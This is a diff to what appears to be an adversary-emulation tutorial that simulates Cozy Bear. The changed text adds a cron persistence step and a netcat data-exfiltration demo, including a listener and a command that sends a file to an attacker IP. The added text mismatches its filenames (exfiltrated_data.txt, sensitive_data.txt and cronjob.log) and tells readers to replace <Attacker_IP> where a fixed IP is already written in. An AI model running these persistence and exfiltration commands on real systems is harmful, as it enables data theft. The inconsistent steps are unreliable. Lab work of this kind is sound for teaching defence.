@@ -94,9 +94,7 @@ whoami
 
 This will show the username of the account that the shell is running under.
 
-Now we will demonstrate how Cozy Bear employs stealthy persistence techniques to maintain access to compromised systems. 
-
-We will be focusing on creating a cron job that will execute a benign script at specified intervals or upon system startup.
+### 11. Now we will demonstrate how Cozy Bear employs stealthy persistence techniques to maintain access to compromised systems. We will be focusing on creating a cron job that will execute a benign script at specified intervals or upon system startup.
 
 Create a new file called create_cronjob.sh and copy the script content into it. Save the file and make it executable using chmod +x create_cronjob.sh.
 
@@ -118,6 +116,31 @@ Monitor the /tmp/cronjob.log file for updates by running cat /tmp/cronjob.log.
 ```
 cat /tmp/cronjob.log
 ```
+### 12. Now we will demonstrate data exfiltration from a compromised Linux system, simulating how Cozy Bear could extract sensitive information after gaining access to a target. For this demo, we will use the nc (netcat) utility to exfiltrate data to a remote server.
+
+Here's a step-by-step guide on how to set up and perform the demonstration:
+
+Set up the attacker's machine: You will need two machines for this demo: one simulating the compromised system (target) and another acting as the attacker's machine (receiver). On the attacker's machine, open a terminal and run the following command to start a netcat listener:
+
+```
+nc -l -p 12345 > /tmp/cronjob.log
+```
+
+This command listens on port 12345 and writes incoming data to a file called exfiltrated_data.txt.
 
 
+Exfiltrate the data: On the target machine, use netcat to send the contents of sensitive_data.txt to the attacker's machine. Replace <Attacker_IP> with the IP address of the attacker's machine:
 
+```
+nc 192.168.101.51 12345 < /tmp/cronjob.log
+```
+
+Verify the exfiltrated data: On the attacker's machine, check the contents of exfiltrated_data.txt to ensure that the data has been successfully exfiltrated:
+
+```
+cat cronjob.log
+```
+
+You should see the content of the cronjob.log file from the target machine.
+
+This demonstration shows a simple example of data exfiltration using netcat. In a real-world scenario, threat actors might use more advanced techniques, such as encrypting the data, tunneling the traffic through other protocols, or using custom tools to avoid detection.
